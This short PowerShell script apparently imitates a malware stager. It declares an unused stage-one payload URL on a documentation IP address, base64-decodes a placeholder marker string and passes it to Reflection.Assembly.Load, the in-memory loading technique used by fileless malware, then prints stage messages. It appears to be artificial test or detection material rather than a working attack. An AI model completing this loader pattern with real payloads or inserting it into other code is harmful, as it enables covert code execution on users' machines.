[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.104:443/payload.bin",
    [int]$TimeoutSec = 51
)
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjppeDAwd2UyeDJh")
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Write-Verbose "stage marker 4 reached"
Write-Output "stage 23 initialized"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
